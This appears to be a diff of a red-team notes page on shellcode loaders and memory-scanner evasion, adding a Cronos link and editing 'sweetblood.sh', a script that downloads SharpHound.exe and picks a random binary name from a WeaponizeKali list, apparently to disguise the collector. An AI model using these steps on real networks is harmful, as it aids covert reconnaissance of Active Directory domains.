@@ -96,6 +96,7 @@ $ gcc -o loader loader.c -z execstack
 - [https://github.com/janoglezcampos/DeathSleep](https://github.com/janoglezcampos/DeathSleep)
 - [https://github.com/kyleavery/AceLdr](https://github.com/kyleavery/AceLdr)
 - [https://blog.kyleavery.com/posts/avoiding-memory-scanners/](https://blog.kyleavery.com/posts/avoiding-memory-scanners/)
+- [https://github.com/Idov31/Cronos](https://github.com/Idov31/Cronos)
 
 
 
@@ -141,7 +142,7 @@ $ gcc -o loader loader.c -z execstack
 
 {% code title="sweetblood.sh" %}
 ```bash
-RNDNAME=`curl -sL https://github.com/penetrarnya-tm/WeaponizeKali.sh/raw/main/misc/binaries.txt | shuf -n1`
+RNDNAME=`curl -sL https://github.com/snovvcrash/WeaponizeKali.sh/raw/main/misc/binaries.txt | shuf -n1`
 wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -qO /tmp/SharpHound.exe
 
 # --ldapusername snovvcrash --ldappassword Passw0rd!
